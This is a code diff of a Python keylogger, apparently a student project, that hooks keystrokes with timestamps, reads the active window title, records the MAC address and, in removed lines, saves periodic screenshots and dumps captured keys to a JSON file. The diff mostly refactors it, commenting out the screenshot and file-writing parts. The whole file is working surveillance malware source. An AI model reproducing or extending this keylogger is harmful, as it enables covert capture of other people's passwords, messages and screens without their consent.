@@ -1,12 +1,9 @@
-import threading
-import time
 import keyboard
 import os
-import  json
+import time
+from PIL import ImageGrab
 from getmac import get_mac_address
 import win32gui
-from PIL import ImageGrab
-
 
 class KeyloggerService:
     def __init__(self):
@@ -18,10 +15,11 @@ class KeyloggerService:
     def __change_action(self):
         self.__action = not (self.__action)
 
-
+    def return_action(self):
+        return self.__action
     def __exit_point(self):
-        if keyboard.is_pressed('q'):
-            os._exit(0)
+        if keyboard.is_pressed('shift+q'):
+            # os._exit(0)
             self.__change_action()
 
     @staticmethod
@@ -39,12 +37,12 @@ class KeyloggerService:
         return pressed_key.name
 
 
-    def current_screenshot(self):
-        if [self.prev_up] != [self.current_app]:
-            screen_shot = ImageGrab.grab()
-            path = rF"C:\Users\1\פרוייקט סיום קודקוד\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
-            screen_shot.save(path)
-            self.prev_up = self.current_app
+    # def current_screenshot(self):
+    #     if [self.prev_up] != [self.current_app]:
+    #         screen_shot = ImageGrab.grab()
+    #         path = rf"C:\Users\1\projet keylogger kodkode\picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
+    #         screen_shot.save(path)
+    #         self.prev_up = self.current_app
 
     def __add_to_data(self, dictionary: dict, data: str):
         current_time = self.__current_time()
@@ -63,10 +61,9 @@ class KeyloggerService:
 
     def start(self):
         self.__change_action()
-        while self.__action:
-            keyboard.on_press(self.__on_press)
-            keyboard.on_release(self.__add_on_release)
-            time.sleep(0.1)
+        keyboard.on_press(self.__on_press)
+        keyboard.on_release(self.__add_on_release)
+        time.sleep(0.1)
 
 
     def get_data(self):
@@ -74,43 +71,8 @@ class KeyloggerService:
         self.__data = {}
         return data
 
-    def __enter__(self):
-        self.start()
+    # def __enter__(self):
+    #     self.start()
 
-    def __exit__(self, exc_type, exc_val, exc_tb):
-        return 1
-
-class FileWriter:
-    @staticmethod
-    def write_to_file(data:dict):
-        with open(r"C:\Users\1\פרוייקט סיום קודקוד\אוסף הקשות.json" , "w" , encoding="utf-8") as file:
-            json.dump(data , file ,ensure_ascii=False)
-
-
-class KeyLoggerManager:
-
-    def __init__(self):
-        self.instance = KeyloggerService()
-
-    def start(self):
-        self.instance.start()
-
-    def write_to_file(self):
-        FileWriter.write_to_file(self.instance.get_data())
-
-    def main(self):
-        threading.Thread(target=self.start).start()
-        while True:
-            print(self.instance.current_app == self.instance.prev_up)
-            self.instance.current_screenshot()
-            threading.Thread(target=self.write_to_file).start()
-            time.sleep(5)
-print(get_mac_address())
-
-A = KeyLoggerManager()
-A.main()
-
-
-
-
-
+    # def __exit__(self, exc_type, exc_val, exc_tb):
+    #     return 1
